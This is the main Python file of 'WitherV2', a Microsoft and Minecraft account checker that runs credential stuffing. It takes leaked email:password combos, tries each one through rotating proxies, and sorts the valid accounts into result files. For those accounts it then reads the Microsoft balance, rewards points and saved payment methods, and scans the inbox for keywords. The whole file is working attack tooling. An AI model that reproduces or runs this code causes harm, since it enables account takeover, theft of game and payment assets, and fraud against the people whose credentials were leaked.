"""
main.py - Main execution file for WitherV2
Executes all checkers and automation scripts based on config.ini settings
"""

import concurrent.futures
import os
import sys
import time
import threading
import random
import re
from datetime import datetime

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from config_handler import init_config, get_config

# Try to import colorama for colored output
try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=False)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    class Fore:
        CYAN = GREEN = YELLOW = RED = MAGENTA = BLUE = WHITE = LIGHTBLUE_EX = LIGHTCYAN_EX = LIGHTYELLOW_EX = ''
    class Style:
        RESET_ALL = ''

# Global statistics
stats = {
    'hits': 0,
    'bad': 0,
    '2fa': 0,
    'valid_mail': 0,
    'xgp': 0,
    'xgpu': 0,
    'other': 0,
    'mfa': 0,
    'sfa': 0,
    'checked': 0,
    'total': 0,
    'cpm': 0,
    'retries': 0,
    'errors': 0
}
stats_lock = threading.Lock()

# Global lists
combos = []
proxies = []
ban_proxies = []
fname = ''

# Results folder
results_folder = ''


def log_info(message):
    """Log info message"""
    if COLORAMA_AVAILABLE:
        print(f'{Fore.CYAN}[INFO] {message}{Fore.RESET}')
    else:
        print(f'[INFO] {message}')


def log_success(message):
    """Log success message"""
    if COLORAMA_AVAILABLE:
        print(f'{Fore.GREEN}[SUCCESS] {message}{Fore.RESET}')
    else:
        print(f'[SUCCESS] {message}')


def log_warning(message):
    """Log warning message"""
    if COLORAMA_AVAILABLE:
        print(f'{Fore.YELLOW}[WARNING] {message}{Fore.RESET}')
    else:
        print(f'[WARNING] {message}')


def log_error(message):
    """Log error message"""
    if COLORAMA_AVAILABLE:
        print(f'{Fore.RED}[ERROR] {message}{Fore.RESET}')
    else:
        print(f'[ERROR] {message}')


def log_hit(message):
    """Log hit message"""
    if COLORAMA_AVAILABLE:
        print(f'{Fore.GREEN}[HIT] {message}{Fore.RESET}')
    else:
        print(f'[HIT] {message}')


def write_result(folder, filename, content):
    """Write content to a result file"""
    try:
        filepath = os.path.join(folder, filename)
        with open(filepath, 'a', encoding='utf-8', errors='ignore') as f:
            f.write(content)
    except Exception as e:
        log_error(f"Failed to write {filename}: {e}")


def load_combos(filename='accs.txt'):
    """Load combos from file"""
    global combos
    
    if not os.path.exists(filename):
        log_error(f"'{filename}' not found!")
        return []
    
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip() and ':' in line]
        
        # Deduplicate
        seen = set()
        unique_lines = []
        for line in lines:
            if line not in seen:
                seen.add(line)
                unique_lines.append(line)
        
        combos = unique_lines
        log_success(f"Loaded {len(combos)} unique combos")
        return combos
    except Exception as e:
        log_error(f"Error loading combos: {e}")
        return []


def load_proxies(filename='proxies.txt'):
    """Load proxies from file"""
    global proxies
    
    if not os.path.exists(filename):
        log_warning(f"'{filename}' not found. Running in proxyless mode.")
        return []
    
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
        
        proxies = lines
        log_success(f"Loaded {len(proxies)} proxies")
        return proxies
    except Exception as e:
        log_error(f"Error loading proxies: {e}")
        return []


def get_proxy():
    """Get a random proxy from the list"""
    if not proxies:
        return None
    return random.choice(proxies)


def setup_results_folder():
    """Create results folder"""
    global results_folder, fname
    
    if not os.path.exists('results'):
        os.makedirs('results')
    
    timestamp = datetime.now().strftime('%Y-%m-%d_%H%M%S')
    fname = timestamp
    results_folder = os.path.join('results', fname)
    
    if not os.path.exists(results_folder):
        os.makedirs(results_folder)
    
    # Create output files
    open(os.path.join(results_folder, 'Hits.txt'), 'a').close()
    open(os.path.join(results_folder, 'Bads.txt'), 'a').close()
    open(os.path.join(results_folder, 'Valid_Mail.txt'), 'a').close()
    open(os.path.join(results_folder, '2FA.txt'), 'a').close()
    open(os.path.join(results_folder, 'MFA.txt'), 'a').close()
    open(os.path.join(results_folder, 'SFA.txt'), 'a').close()
    open(os.path.join(results_folder, 'Banned.txt'), 'a').close()
    open(os.path.join(results_folder, 'Unbanned.txt'), 'a').close()
    open(os.path.join(results_folder, 'XboxGamePass.txt'), 'a').close()
    open(os.path.join(results_folder, 'XboxGamePassUltimate.txt'), 'a').close()
    open(os.path.join(results_folder, 'Normal.txt'), 'a').close()
    
    log_info(f"Results will be saved to: results/{fname}")
    return results_folder


def determine_thread_count():
    """Determine thread count based on proxy availability and config"""
    cfg = get_config()
    
    # Check if proxies exist
    if os.path.exists('proxies.txt'):
        try:
            with open('proxies.txt', 'r') as f:
                proxy_count = len([line for line in f if line.strip()])
        except:
            proxy_count = 0
    else:
        proxy_count = 0
    
    if proxy_count > 0:
        # Use config.ini thread setting
        threads = cfg.get_threads()
        log_info(f"Using {threads} threads (proxies available)")
    else:
        # No proxies - limit to 3 threads
        threads = 3
        log_warning(f"No proxies found. Limiting to {threads} threads (proxyless mode)")
    
    return threads


def run_minecraft_checker(email, password, session=None):
    """Run Minecraft/Hypixel checker"""
    cfg = get_config()
    
    # Import the checker
    try:
        from checkers.minecraft_checker import check_account as mc_check
        
        # Determine what checks to run
        check_ban = cfg.enable_ban_checking() and cfg.get_hypixelban()
        check_email = cfg.check_email_access()
        check_sb = cfg.check_skyblock_coins() or cfg.check_skyblock_networth()
        
        # Run the checker
        result = mc_check(
            email=email,
            password=password,
            check_ban=check_ban,
            check_email=check_email,
            check_sb=check_sb,
            ban_proxies=ban_proxies if cfg.use_ban_proxies() else None
        )
        
        return result
    except Exception as e:
        log_error(f"Minecraft checker error: {e}")
        return None


def run_nitro_checker(email, password, session=None):
    """Run Nitro checker"""
    cfg = get_config()
    
    # This would check for Discord Nitro if the checker is configured
    # For now, we'll skip if not explicitly needed
    pass


def run_balance_checker(email, password, session):
    """Run Microsoft balance checker"""
    cfg = get_config()
    
    if not cfg.check_microsoft_balance():
        return None
    
    try:
        from checkers.balance_checker import check_balance
        
        balance = check_balance(session)
        if balance and balance != "0.00 USD":
            write_result(results_folder, 'Microsoft_Balance.txt', 
                        f'{email}:{password} | Balance: {balance}\n')
            return balance
    except Exception as e:
        log_error(f"Balance checker error: {e}")
    
    return None


def run_reward_points_checker(email, password, session):
    """Run Microsoft Rewards points checker"""
    cfg = get_config()
    
    if not cfg.check_reward_points():
        return None
    
    try:
        from checkers.rewardpoints_checker import check_rewards_points
        
        points = check_rewards_points(session)
        if points:
            write_result(results_folder, 'Ms_Points.txt',
                        f'{email}:{password} | Points: {points}\n')
            return points
    except Exception as e:
        log_error(f"Rewards checker error: {e}")
    
    return None


def run_payment_methods_checker(email, password, session):
    """Run payment methods checker"""
    cfg = get_config()
    
    if not (cfg.check_payment_methods() or cfg.check_credit_cards() or cfg.check_paypal()):
        return None
    
    try:
        from checkers.paymentmethods_checker import check_payment_methods
        
        methods = check_payment_methods(session)
        if methods:
            write_result(results_folder, 'Payment_Methods.txt',
                        f'{email}:{password} | Methods: {", ".join(methods)}\n')
            return methods
    except Exception as e:
        log_error(f"Payment methods checker error: {e}")
    
    return None


def run_inbox_checker(email, password, session):
    """Run inbox checker"""
    cfg = get_config()
    
    if not cfg.scan_inbox():
        return None
    
    try:
        from checkers.inbox_checker import check_inbox
        
        keywords = cfg.get_inbox_keywords().split(',')
        keywords = [k.strip() for k in keywords if k.strip()]
        
        results = check_inbox(session, email, keywords)
        if results:
            formatted = ', '.join([f'{k} {v}' for k, v in results])
            write_result(results_folder, 'Inboxes.txt',
                        f'{email}:{password} | Inbox - {formatted}\n')
            return results
    except Exception as e:
        log_error(f"Inbox checker error: {e}")
    
    return None


def run_donutsmp_checker(email, password, username, ban_status=None):
    """Run DonutSMP stats checker"""
    cfg = get_config()
    
    if not cfg.donut_stats_enabled():
        return None
    
    try:
        from checkers.donutsmp_stats import check_donut_smp
        
        result = check_donut_smp(email, password, username, ban_status, proxies)
        return result
    except Exception as e:
        log_error(f"DonutSMP checker error: {e}")
    
    return None


def run_xbox_codes_checker(email, password, session):
    """Run Xbox codes extractor"""
    cfg = get_config()
    
    # This would check for Xbox codes if enabled
    pass


def process_account(combo):
    """Process a single account"""
    global stats
    
    try:
        combo = combo.strip()
        if not combo or ':' not in combo:
            with stats_lock:
                stats['bad'] += 1
                stats['checked'] += 1
            return
        
        parts = combo.split(':', 1)
        email = parts[0].strip()
        password = parts[1].strip() if len(parts) > 1 else ''
        
        if not email or not password:
            with stats_lock:
                stats['bad'] += 1
                stats['checked'] += 1
            return
        
        # Create session
        import requests
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Apply proxy if available
        if proxies:
            proxy = get_proxy()
            if proxy:
                session.proxies = {'http': proxy, 'https': proxy}
        
        # Run Minecraft/Hypixel checker if enabled
        cfg = get_config()
        
        mc_result = None
        if cfg.check_minecraft_ownership() or cfg.check_xbox_game_pass() or cfg.check_xbox_game_pass_ultimate():
            mc_result = run_minecraft_checker(email, password, session)
        
        # Process results
        if mc_result:
            status = mc_result.get('status')
            
            if status == 'Hit':
                with stats_lock:
                    stats['hits'] += 1
                
                account_type = mc_result.get('account_type', '')
                
                # Save based on account type
                if 'Game Pass Ultimate' in account_type or 'XGPU' in account_type.upper():
                    with stats_lock:
                        stats['xgpu'] += 1
                    if cfg.save_xbox_game_pass_ultimate():
                        write_result(results_folder, 'XboxGamePassUltimate.txt', f'{email}:{password}\n')
                elif 'Game Pass' in account_type:
                    with stats_lock:
                        stats['xgp'] += 1
                    if cfg.save_xbox_game_pass():
                        write_result(results_folder, 'XboxGamePass.txt', f'{email}:{password}\n')
                
                if 'Normal Minecraft' in account_type:
                    if cfg.save_normal_minecraft():
                        write_result(results_folder, 'Normal.txt', f'{email}:{password}\n')
                
                # Save to Hits
                if cfg.save_hits():
                    write_result(results_folder, 'Hits.txt', f'{email}:{password}\n')
                
                # Check email access
                email_access = mc_result.get('email_access')
                if email_access == 'True':
                    with stats_lock:
                        stats['mfa'] += 1
                    if cfg.save_mfa():
                        write_result(results_folder, 'MFA.txt', f'{email}:{password}\n')
                elif email_access == 'False':
                    with stats_lock:
                        stats['sfa'] += 1
                    if cfg.save_sfa():
                        write_result(results_folder, 'SFA.txt', f'{email}:{password}\n')
                
                # Check ban status
                hypixel_ban = mc_result.get('hypixel_ban')
                if hypixel_ban is not None:
                    if hypixel_ban:
                        if cfg.save_banned():
                            write_result(results_folder, 'Banned.txt', f'{email}:{password}\n')
                    else:
                        if cfg.save_unbanned():
                            write_result(results_folder, 'Unbanned.txt', f'{email}:{password}\n')
                
                # Log hit
                username = mc_result.get('name', 'N/A')
                log_hit(f"{email}:{password} | {account_type} | {username}")
                
            elif status == '2FA':
                with stats_lock:
                    stats['2fa'] += 1
                if cfg.save_2fa():
                    write_result(results_folder, '2FA.txt', f'{email}:{password}\n')
                log_info(f"2FA: {email}")
                
            elif status == 'Bad':
                with stats_lock:
                    stats['bad'] += 1
                if cfg.save_bad():
                    write_result(results_folder, 'Bads.txt', f'{email}:{password}\n')
        
        # Run additional checkers if enabled
        if mc_result and mc_result.get('status') == 'Hit':
            username = mc_result.get('name')
            
            # Run balance checker
            run_balance_checker(email, password, session)
            
            # Run rewards checker
            run_reward_points_checker(email, password, session)
            
            # Run payment methods checker
            run_payment_methods_checker(email, password, session)
            
            # Run inbox checker
            run_inbox_checker(email, password, session)
            
            # Run DonutSMP checker
            ban_status = mc_result.get('hypixel_ban_status')
            run_donutsmp_checker(email, password, username, ban_status)
        
        with stats_lock:
            stats['checked'] += 1
    
    except Exception as e:
        with stats_lock:
            stats['errors'] += 1
            stats['checked'] += 1
        log_error(f"Error processing account: {e}")


def run_automation():
    """Run automation scripts based on config"""
    cfg = get_config()
    
    log_info("Running automation scripts...")
    
    # Run auto_mark_lost.py if enabled
    try:
        from automation.auto_mark_lost import auto_mark_lost
        log_info("Running auto_mark_lost...")
        # auto_mark_lost()  # Uncomment if the function is defined
    except ImportError as e:
        log_warning(f"Could not import auto_mark_lost: {e}")
    except Exception as e:
        log_error(f"Error in auto_mark_lost: {e}")
    
    # Run autorename.py if enabled
    if cfg.auto_set_name():
        try:
            from automation.autorename import auto_rename
            log_info("Running autorename...")
            # auto_rename()  # Uncomment if the function is defined
        except ImportError as e:
            log_warning(f"Could not import autorename: {e}")
        except Exception as e:
            log_error(f"Error in autorename: {e}")
    
    log_info("Automation complete")


def print_stats():
    """Print final statistics"""
    if COLORAMA_AVAILABLE:
        print(f"\n{Fore.CYAN}{'=' * 60}")
        print(f"{Fore.GREEN}✓ CHECKING COMPLETED!")
        print(f"{Fore.CYAN}{'=' * 60}{Fore.RESET}\n")
        
        print(f"{Fore.WHITE}Time: {Fore.CYAN}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Fore.RESET}")
        print(f"{Fore.WHITE}Hits: {Fore.GREEN}{stats['hits']}{Fore.RESET}")
        print(f"{Fore.WHITE}Bad: {Fore.RED}{stats['bad']}{Fore.RESET}")
        print(f"{Fore.WHITE}2FA: {Fore.MAGENTA}{stats['2fa']}{Fore.RESET}")
        print(f"{Fore.WHITE}MFA: {Fore.GREEN}{stats['mfa']}{Fore.RESET}")
        print(f"{Fore.WHITE}SFA: {Fore.YELLOW}{stats['sfa']}{Fore.RESET}")
        print(f"{Fore.WHITE}XGP: {Fore.LIGHTBLUE_EX}{stats['xgp']}{Fore.RESET}")
        print(f"{Fore.WHITE}XGPU: {Fore.LIGHTCYAN_EX}{stats['xgpu']}{Fore.RESET}")
        print(f"{Fore.WHITE}Valid Mail: {Fore.WHITE}{stats['valid_mail']}{Fore.RESET}")
        print(f"{Fore.WHITE}Errors: {Fore.RED}{stats['errors']}{Fore.RESET}")
        print(f"\n{Fore.CYAN}Results saved to: results/{fname}")
        print(f"{Fore.CYAN}{'=' * 60}{Fore.RESET}\n")
    else:
        print(f"\n{'=' * 60}")
        print("CHECKING COMPLETED!")
        print(f"{'=' * 60}\n")
        print(f"Hits: {stats['hits']}")
        print(f"Bad: {stats['bad']}")
        print(f"2FA: {stats['2fa']}")
        print(f"MFA: {stats['mfa']}")
        print(f"SFA: {stats['sfa']}")
        print(f"XGP: {stats['xgp']}")
        print(f"XGPU: {stats['xgpu']}")
        print(f"Errors: {stats['errors']}")
        print(f"\nResults saved to: results/{fname}")
        print(f"{'=' * 60}\n")


def update_title():
    """Update console title with stats"""
    while stats['checked'] < stats['total']:
        try:
            total = stats['total']
            checked = stats['checked']
            hits = stats['hits']
            bad = stats['bad']
            cpm = stats['cpm']
            
            title = f"WitherV2 | Checked: {checked}/{total} - Hits: {hits} - Bad: {bad} - CPM: {cpm}"
            
            if sys.platform == 'win32':
                try:
                    import ctypes
                    ctypes.windll.kernel32.SetConsoleTitleW(title)
                except:
                    pass
        except:
            pass
        
        time.sleep(1)


def main():
    """Main entry point"""
    global stats
    
    print("\n" + "=" * 60)
    print("WitherV2 - Microsoft Account Checker")
    print("=" * 60 + "\n")
    
    # Initialize config
    log_info("Loading configuration...")
    cfg = init_config('config.ini')
    log_success("Configuration loaded")
    
    # Display enabled features
    log_info("Enabled features:")
    if cfg.check_minecraft_ownership():
        log_info("  - Minecraft Ownership Check")
    if cfg.check_xbox_game_pass():
        log_info("  - Xbox Game Pass Check")
    if cfg.check_xbox_game_pass_ultimate():
        log_info("  - Xbox Game Pass Ultimate Check")
    if cfg.check_hypixel_rank() or cfg.check_hypixel_level():
        log_info("  - Hypixel Stats")
    if cfg.check_email_access():
        log_info("  - Email Access Check")
    if cfg.check_microsoft_balance():
        log_info("  - Microsoft Balance Check")
    if cfg.check_reward_points():
        log_info("  - Rewards Points Check")
    if cfg.check_payment_methods():
        log_info("  - Payment Methods Check")
    if cfg.scan_inbox():
        log_info("  - Inbox Scanning")
    if cfg.donut_stats_enabled():
        log_info("  - DonutSMP Stats")
    if cfg.enable_ban_checking():
        log_info("  - Hypixel Ban Checking")
    
    # Load combos
    log_info("\nLoading accounts...")
    combos = load_combos('accs.txt')
    
    if not combos:
        log_error("No accounts loaded. Exiting.")
        return
    
    stats['total'] = len(combos)
    
    # Load proxies
    log_info("\nLoading proxies...")
    load_proxies('proxies.txt')
    
    # Determine thread count
    threads = determine_thread_count()
    
    # Setup results folder
    setup_results_folder()
    
    # Start title update thread
    title_thread = threading.Thread(target=update_title, daemon=True)
    title_thread.start()
    
    # Start checking
    log_info(f"\nStarting check on {len(combos)} accounts with {threads} threads...\n")
    
    start_time = time.time()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(process_account, combo) for combo in combos]
        
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                log_error(f"Worker error: {e}")
    
    # Calculate CPM
    elapsed = time.time() - start_time
    if elapsed > 0:
        stats['cpm'] = int(stats['checked'] / elapsed * 60)
    
    # Print final stats
    print_stats()
    
    # Run automation
    run_automation()
    
    log_success("Done!")


if __name__ == '__main__':
    main()
